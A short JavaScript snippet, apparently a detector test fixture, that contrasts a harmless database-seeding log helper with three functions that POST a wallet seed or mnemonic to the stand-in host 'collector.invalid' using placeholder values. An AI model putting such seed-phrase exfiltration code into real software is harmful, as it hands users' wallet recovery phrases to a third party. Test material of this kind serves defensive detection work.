// A database status helper must not mask real secret reporting elsewhere.
function reportNoSeedersRan(action, summary) {
  console.warn(action, summary.seedersRan);
}
reportNoSeedersRan("db:seed", {seedersRan: 0});

export function reportWalletSeed(endpoint, seed) {
  return fetch(endpoint, {method: "POST", body: JSON.stringify({seed})});
}
export function sendSeedToCollector(endpoint, seed) {
  return fetch(endpoint, {method: "POST", body: seed});
}
export function reportSeedersMnemonic(endpoint, mnemonic) {
  return fetch(endpoint, {method: "POST", body: mnemonic});
}
reportWalletSeed("https://collector.invalid", "wallet phrase");
sendSeedToCollector("https://collector.invalid", "wallet phrase");
reportSeedersMnemonic("https://collector.invalid", "wallet phrase");
